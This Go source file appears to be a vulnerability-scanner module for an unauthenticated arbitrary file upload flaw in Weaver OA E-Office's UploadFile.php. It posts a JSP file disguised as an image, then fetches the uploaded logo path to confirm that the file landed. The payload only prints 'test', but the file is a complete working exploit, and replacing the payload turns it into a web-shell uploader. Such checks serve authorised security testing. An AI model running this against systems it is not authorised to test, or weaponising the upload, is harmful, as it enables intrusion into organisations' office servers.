package ecology_uploadFile_office

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="

	// 构建手动的请求体
	body := "--e64bdf16c554bbc109cecef6451c26a4\r\n"
	body += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"test123.jsp\"\r\n"
	body += "Content-Type: image/jpeg\r\n\r\n"
	body += "<%out.print(\"test\");%>\r\n"
	body += "--e64bdf16c554bbc109cecef6451c26a4--\r\n"

	// 发送POST请求
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4",
		}).
		SetBodyString(body).
		Post(vulnUrl)

	if err != nil || resp.StatusCode != 200 {
		return false
	}

	// 第二个GET请求
	testUrl := url + "/images/logo/logo-eoffice.php"
	testResp, testErr := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(testUrl)

	if testErr == nil && testResp.StatusCode == 200 && strings.Contains(testResp.String(), "test") {
		return true
	}

	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		testUrl := url + "/images/logo/logo-eoffice.php"
		color.Green.Println("[+16] 泛微OA E-Office UploadFile.php 任意文件上传漏洞存在 -> ", testUrl)
	} else {
		color.Red.Println("[-16] 泛微OA E-Office UploadFile.php 任意文件上传漏洞不存在")
	}
}
